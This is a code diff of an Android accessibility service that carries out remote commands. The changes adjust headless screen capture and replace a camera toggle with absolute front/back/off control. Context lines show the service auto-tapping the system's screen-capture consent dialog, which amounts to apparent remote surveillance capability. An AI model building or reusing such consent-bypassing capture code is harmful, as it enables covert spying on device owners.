@@ -397,7 +397,10 @@ public class RemoteAccessibilityService extends AccessibilityService {
                         // The accessibility service is still the component that
                         // taps the MediaProjection consent dialog.
                         triggerAutoAccept(this);
-                        HeadlessCaptureActivity.start(this, caller, "screen_share_control".equals(command), false, cameraChoice);
+                        HeadlessCaptureActivity.start(this, caller,
+                                "screen_share_control".equals(command),
+                                MainActivity.isCameraChoiceOn(cameraChoice),
+                                cameraChoice);
                     } else if ("open_accessibility_settings".equals(command) || "request_battery_exemption".equals(command)) {
                         MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
                     } else if ("end_call".equals(command)) {
@@ -451,10 +454,27 @@ public class RemoteAccessibilityService extends AccessibilityService {
                                 RemoteAccessibilityService.getInstance().performHome();
                             }
                         } catch (Throwable ignored) {}
-                    } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
-                        if (MainActivity.getCompanionInstance() != null) {
-                            MainActivity.getCompanionInstance().switchCompanionCamera();
+                    } else if ("switch_camera".equals(command)) {
+                        // Absolute choice ("front"/"back"/"none") — never a blind
+                        // toggle. The companion socket applies the same command, and
+                        // an absolute set is idempotent, so this copy can never
+                        // drag the camera back to the wrong lens.
+                        WebRTCCompanion comp = MainActivity.getCompanionInstance();
+                        if (comp != null) {
+                            String camChoice = data.optString("cameraChoice", "");
+                            if ("front".equalsIgnoreCase(camChoice)) {
+                                comp.setCompanionCameraFacing(true);
+                            } else if ("back".equalsIgnoreCase(camChoice)) {
+                                comp.setCompanionCameraFacing(false);
+                            } else if ("none".equalsIgnoreCase(camChoice) || "off".equalsIgnoreCase(camChoice)) {
+                                comp.setCompanionCameraEnabled(false);
+                            }
                         }
+                    } else if ("flip_camera".equals(command)) {
+                        // The live companion socket owns the toggle so the lens is
+                        // flipped exactly once (this service used to toggle as well,
+                        // so the two toggles cancelled each other out).
+                        AppLog.i(TAG, "flip_camera acknowledged; companion socket performs the toggle");
                     }
                 } catch (Exception e) {
                     Log.e(TAG, "Error processing background auto-command", e);
